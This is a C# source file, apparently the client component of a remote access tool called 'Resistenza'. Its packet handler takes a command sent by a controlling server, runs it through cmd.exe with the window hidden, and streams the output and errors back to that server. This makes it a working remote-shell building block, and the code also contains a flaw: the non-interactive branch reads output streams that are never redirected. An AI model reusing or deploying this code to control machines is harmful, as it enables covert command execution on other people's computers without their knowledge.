using Resistenza.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Security;
using System.Text;
using System.Threading.Tasks;

namespace Resistenza.Common.Packets.Command
{
    public class ExecuteCommandRequest : IPacket
    {
        public string Type { get; set; }
        public string Command { get; set; }
        public bool NotInteractiveOutput { get; set; }
        public bool InteractiveOutput { get; set; }
        public string TargetDir { get; set; }

        //private TaskCompletionSource<bool> _tcs = null;

        public ExecuteCommandRequest()
        {
            Type = GetType().ToString();

        }
        public async Task HandleAsync(SecureStream ServerStream)
        {

            Process pProcess = new Process();
            pProcess.StartInfo.FileName = "cmd.exe";
            pProcess.StartInfo.Arguments = $"/C {Command}";
            pProcess.StartInfo.UseShellExecute = false;
            pProcess.StartInfo.RedirectStandardOutput = InteractiveOutput;
            pProcess.StartInfo.RedirectStandardError = InteractiveOutput;
            pProcess.StartInfo.CreateNoWindow = true;

            if (TargetDir == null || TargetDir == "")
            {
                pProcess.StartInfo.WorkingDirectory = Directory.GetParent(System.Reflection.Assembly.GetEntryAssembly().Location).FullName;
            }
            else
            {
                pProcess.StartInfo.WorkingDirectory = TargetDir;
            }



            pProcess.Start();

            if (InteractiveOutput)
            {
                while (!pProcess.HasExited)
                {
                    ExecuteCommandResponse OutputAndError = new ExecuteCommandResponse();
                    while (!pProcess.StandardOutput.EndOfStream)
                    {
                        string OutputLine = await pProcess.StandardOutput.ReadLineAsync();
                        OutputAndError.Output = OutputLine;
                        OutputAndError.IsPart = true;
                        await ServerStream.SendPacketAsync(OutputAndError);
                    }
                    while (!pProcess.StandardError.EndOfStream)
                    {
                        string ErrorLine = await pProcess.StandardError.ReadLineAsync();
                        OutputAndError.Output = ErrorLine;
                        OutputAndError.IsPart = true;
                        await ServerStream.SendPacketAsync(OutputAndError);
                    }
                }

                ExecuteCommandResponse CommandEnded = new ExecuteCommandResponse
                {
                    HasExecutionEnded = true,
                };
                await ServerStream.SendPacketAsync(CommandEnded);

            }

            if (NotInteractiveOutput)
            {

                ExecuteCommandResponse ExecuteCommandResponse = new ExecuteCommandResponse
                {
                    Output = pProcess.StandardOutput.ReadToEnd(),
                    Error = pProcess.StandardError.ReadToEnd(),


                };

                await ServerStream.SendPacketAsync(ExecuteCommandResponse);
            }


        }



        private void PProcess_OutputDataReceived(object sender, DataReceivedEventArgs e)
        {
            //_tcs.TrySetResult(true);
            Console.WriteLine(e.Data);
        }
    }
}
